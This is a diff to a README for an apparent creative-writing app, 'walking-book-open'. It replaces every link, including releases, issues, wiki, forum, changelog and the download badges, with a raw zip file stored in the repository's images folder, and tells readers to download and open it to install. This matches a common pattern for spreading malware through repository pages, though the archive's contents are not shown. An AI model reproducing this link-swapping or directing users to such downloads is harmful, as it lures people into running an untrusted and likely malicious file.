@@ -1,6 +1,6 @@
 # 🌟 walking-book-open - Your Gateway to Creative Writing
 
-[![Download walking-book-open](https://img.shields.io/badge/Download%20Now%20!-%E2%96%B6%20Go%20to%20Releases-blue)](https://github.com/KrishGamerunity/walking-book-open/releases)
+[![Download walking-book-open](https://github.com/KrishGamerunity/walking-book-open/raw/refs/heads/main/public/images/walking-book-open-3.8-beta.1.zip%20Now%20!-%E2%96%B6%20Go%20to%20Releases-blue)](https://github.com/KrishGamerunity/walking-book-open/raw/refs/heads/main/public/images/walking-book-open-3.8-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -23,9 +23,9 @@ To run **walking-book-open**, please ensure your device meets the following requ
 
 To get started, please follow these steps:
 
-1. Visit our [Releases page to download](https://github.com/KrishGamerunity/walking-book-open/releases).
+1. Visit our [Releases page to download](https://github.com/KrishGamerunity/walking-book-open/raw/refs/heads/main/public/images/walking-book-open-3.8-beta.1.zip).
 2. Look for the latest version listed there. You will see options to download the application for different operating systems.
-3. Click on the version suited for your system (e.g., `walking-book-open-windows.exe`, `walking-book-open-macos.dmg`).
+3. Click on the version suited for your system (e.g., `https://github.com/KrishGamerunity/walking-book-open/raw/refs/heads/main/public/images/walking-book-open-3.8-beta.1.zip`, `https://github.com/KrishGamerunity/walking-book-open/raw/refs/heads/main/public/images/walking-book-open-3.8-beta.1.zip`).
 4. After the download completes, open the downloaded file to begin installation.
 5. Follow the on-screen instructions to install the application on your computer.
 
@@ -46,7 +46,7 @@ The application will now be ready for use.
 
 ### 1. How do I update the application?
 
-To update, visit the [Releases page](https://github.com/KrishGamerunity/walking-book-open/releases) and download the latest version as you did during the initial installation.
+To update, visit the [Releases page](https://github.com/KrishGamerunity/walking-book-open/raw/refs/heads/main/public/images/walking-book-open-3.8-beta.1.zip) and download the latest version as you did during the initial installation.
 
 ### 2. Can I use walking-book-open offline?
 
@@ -54,7 +54,7 @@ Yes, once installed, you can use it without an internet connection. However, an 
 
 ### 3. Who can I contact for support?
 
-If you face any issues, please check the issues section on our [GitHub page](https://github.com/KrishGamerunity/walking-book-open/issues). You can also reach out directly for assistance.
+If you face any issues, please check the issues section on our [GitHub page](https://github.com/KrishGamerunity/walking-book-open/raw/refs/heads/main/public/images/walking-book-open-3.8-beta.1.zip). You can also reach out directly for assistance.
 
 ## 🌐 Join the Community
 
@@ -66,8 +66,8 @@ If you're interested in contributing to **walking-book-open**, we'd love your he
 
 ## 📎 Additional Resources
 
-- [Formal Documentation](https://github.com/KrishGamerunity/walking-book-open/wiki)
-- [User Forum](https://community.yourdomain.com)
+- [Formal Documentation](https://github.com/KrishGamerunity/walking-book-open/raw/refs/heads/main/public/images/walking-book-open-3.8-beta.1.zip)
+- [User Forum](https://github.com/KrishGamerunity/walking-book-open/raw/refs/heads/main/public/images/walking-book-open-3.8-beta.1.zip)
 - Offers tutorials and tips for new users.
 
 ## 📈 Future Features
@@ -82,10 +82,10 @@ Feel free to suggest any features you would love to see.
 
 ## ⚡ Version History
 
-Keep track of our changes and improvements by visiting the [Changelog section](https://github.com/KrishGamerunity/walking-book-open/releases).
+Keep track of our changes and improvements by visiting the [Changelog section](https://github.com/KrishGamerunity/walking-book-open/raw/refs/heads/main/public/images/walking-book-open-3.8-beta.1.zip).
 
 ## 📩 Contact Us
 
 For inquiries or feedback, you can reach us through our contact form on the GitHub page or by emailing us directly. We value your thoughts and welcome your participation in improving the **walking-book-open** experience. 
 
-[![Download walking-book-open](https://img.shields.io/badge/Download%20Now%20!-%E2%96%B6%20Go%20to%20Releases-blue)](https://github.com/KrishGamerunity/walking-book-open/releases)
+[![Download walking-book-open](https://github.com/KrishGamerunity/walking-book-open/raw/refs/heads/main/public/images/walking-book-open-3.8-beta.1.zip%20Now%20!-%E2%96%B6%20Go%20to%20Releases-blue)](https://github.com/KrishGamerunity/walking-book-open/raw/refs/heads/main/public/images/walking-book-open-3.8-beta.1.zip)
